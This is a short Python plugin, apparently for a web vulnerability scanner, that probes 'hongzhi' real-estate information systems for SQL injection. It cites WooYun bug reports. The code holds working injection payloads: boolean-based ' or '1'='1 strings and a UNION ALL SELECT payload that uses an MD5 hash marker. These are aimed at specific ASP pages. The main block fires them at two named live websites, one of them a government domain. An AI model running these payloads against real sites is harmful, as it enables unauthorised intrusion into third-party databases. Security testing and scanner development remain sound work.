#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-078982
#refer:http://www.wooyun.org/bugs/wooyun-2010-079039

def assign(service, arg):
    if service == "hongzhi":
        return True, arg
        
        
def audit(arg): 
    payloads = [
        'PubInfo/ldxx.asp?QryId=1',
        'web/PubInfo/ldxx.asp?QryId=1'
    ]
    getdata1 = '%27%20or%20%271%27%3D%271'
    getdata2 = '%27%20or%20%271%27%3D%272'
    for payload in payloads:
        url1 = arg + payload +getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)
        if code1 == 500 and code2 ==200 and  'gray.gif' not in res1 and 'gray.gif' in res2 :
            security_hole(arg + payload + '   :found sql Injection')

            
    anpayloads=[
        'pubinfo/Moreysxk.asp?Qryxmmc=111',
        'web/pubinfo/Moreysxk.asp?Qryxmmc=111'
    ]
    angetdata = '%25%27%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271234%27%29%29%2C6%2C7%2C8%2C9--%20%26Qryxkzh%3D1'
    for anpayload in anpayloads:
        url = arg + anpayload + angetdata
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res :
            security_hole(arg + anpayload + '   :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('hongzhi', 'http://www.tmfdc.gov.cn/')[1])
    audit(assign('hongzhi', 'http://www.yafcj.com/')[1])
